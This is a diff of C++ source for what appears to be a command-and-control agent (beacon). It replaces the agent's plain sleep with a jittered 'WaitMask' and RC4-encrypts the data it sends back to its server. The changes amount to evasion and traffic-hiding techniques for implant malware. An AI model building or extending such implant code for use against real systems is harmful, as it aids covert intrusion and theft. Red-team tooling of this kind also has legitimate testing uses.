@@ -3,6 +3,7 @@
 #include "Commander.h"
 #include "utils.h"
 #include "Crypt.h"
+#include "WaitMask.h"
 
 Agent*         g_Agent;
 ConnectorHTTP* g_Connector;
@@ -49,7 +50,7 @@ void AgentMain()
 
 		g_Agent->commander->ProcessCommandTasks(recvData, recvDataSize, packerOut);
 		if (g_Agent->IsActive() && packerOut->GetDataSize() < 8 )
-			Sleep( g_Agent->config->sleep_delay * 1000 );
+			WaitMask( g_Agent->config->sleep_delay * 1000, g_Agent->config->jitter_delay );
 
 		g_Agent->downloader->ProcessDownloadTasks(packerOut);			
 		g_Agent->jober->ProcessJobs(packerOut);
@@ -60,6 +61,7 @@ void AgentMain()
 
 	BYTE* data     = packerOut->GetData();
 	ULONG dataSize = packerOut->GetDataSize();
+	EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);
 
 	g_Connector->SendData(data, dataSize, &recvDataSize);
 	AgentClear(g_Agent->config->exit_method);
